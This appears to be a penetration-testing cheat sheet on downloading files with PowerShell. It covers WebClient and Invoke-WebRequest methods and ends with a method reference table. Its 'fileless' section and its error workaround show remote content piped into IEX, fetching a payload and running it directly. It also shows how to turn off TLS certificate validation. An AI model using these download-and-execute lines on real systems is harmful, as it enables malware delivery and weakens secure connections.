DOWNLOADING FILES FROM WEB WITH POWERSHELL


1) DownloadFile Method

(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

__________________________________________________________________________________________

2) Fileless Method 

Uses some operating system functions to download the payload and execute it directly.Uses Invole Expression (IEX).


(New-Object Net.WebClient).DownloadString('<Web_URL_path_of_file>')

(New-Object Net.WebClient).DownloadString('<Web_URL_path_of_file>') | IEX

__________________________________________________________________________________________

3) Invoke-WebRequest Method

Invoke-WebRequest <Web_URL_path_of_file> -OutFile <file_name_to_be_saved>

__________________________________________________________________________________________

4) Errors with PowerShell


Internet Explorer first-launch configuration has not been completed, which prevents the download.(use -UseBasicParsing)

Invoke-WebRequest https://<ip>/<file_name> -UseBasicParsing | IEX

SSL/TLS secure channel if the certificate is not trusted (use ServerCertificateValidationCallback )

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

__________________________________________________________________________________________	


METHODS

OpenRead 	Returns the data from a resource as a Stream.
OpenReadAsync 	Returns the data from a resource without blocking the calling thread.
DownloadData 	Downloads data from a resource and returns a Byte array.
DownloadDataAsync 	Downloads data from a resource and returns a Byte array without blocking the calling thread.
DownloadFile 	Downloads data from a resource to a local file.
DownloadFileAsync 	Downloads data from a resource to a local file without blocking the calling thread.
DownloadString 	Downloads a String from a resource and returns a String.
DownloadStringAsync 	Downloads a String from a resource without blocking the calling thread.